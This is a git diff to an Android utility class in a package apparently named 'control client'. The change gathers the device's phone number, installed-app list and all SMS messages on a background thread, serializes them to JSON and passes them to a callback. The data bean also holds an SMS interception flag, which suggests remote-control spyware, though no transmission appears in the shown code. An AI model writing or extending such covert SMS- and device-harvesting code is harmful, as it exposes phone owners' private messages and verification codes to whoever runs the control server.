@@ -22,33 +22,47 @@ import java.util.UUID;
 
 import contol.android.kamike.com.contolclient.bean.AppInfoBean;
 import contol.android.kamike.com.contolclient.bean.ClientInfoBean;
+import contol.android.kamike.com.contolclient.bean.SmsInfoBean;
 
 /**
  * Created by Administrator on 2017/9/24.
  */
 
 public class AllUtils {
-    public static String getClientInfo(Context context) {
-        ClientInfoBean info = new ClientInfoBean();
+    public static ArrayList<AppInfoBean> listAllApp = new ArrayList<>();
+    public static ArrayList<SmsInfoBean> listAllSms = new ArrayList<>();
+
+    public static String getClientInfo(Context context, boolean isAllData, final OnSmsAppComeplete listener) {
+        final ClientInfoBean info = new ClientInfoBean();
         info.androidVersion = android.os.Build.VERSION.RELEASE;
         info.phoneModle = Build.MODEL;
-
-        ArrayList<AppInfoBean> list = new ArrayList<>();
-        for (AppUtils.AppInfo app : AppUtils.getAppsInfo()) {
-            AppInfoBean myApp = new AppInfoBean();
-            myApp.isSystem = app.isSystem();
-            myApp.name = app.getName();
-            myApp.packageName = app.getPackageName();
-            myApp.versionName = app.getVersionName();
-            list.add(myApp);
-        }
-        info.appList = list;
-        info.smsList = SmsUtils.getAllSMS();
-
         info.deviceId = getUUIDCache();
         info.isInterceptSMS = false;
         TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
         info.phoneNumber = tm.getLine1Number();
+        new Thread() {
+            @Override
+            public void run() {
+                listAllApp.clear();
+                for (AppUtils.AppInfo app : AppUtils.getAppsInfo()) {
+                    AppInfoBean myApp = new AppInfoBean();
+                    myApp.isSystem = app.isSystem();
+                    myApp.name = app.getName();
+                    myApp.packageName = app.getPackageName();
+                    myApp.versionName = app.getVersionName();
+                    listAllApp.add(myApp);
+                }
+                info.appList = listAllApp;
+
+                listAllSms = SmsUtils.getAllSMS();
+                info.smsList = listAllSms;
+                if (listener != null) {
+                    listener.onComplete(JSON.toJSONString(info));
+                }
+            }
+        }.start();
+
+
         return JSON.toJSONString(info);
     }
 
@@ -148,5 +162,9 @@ public class AllUtils {
         return bitmap;// 压缩好比例大小后再进行质量压缩
     }
 
+
+    public interface OnSmsAppComeplete {
+        void onComplete(String jsonData);
+    }
 
 }
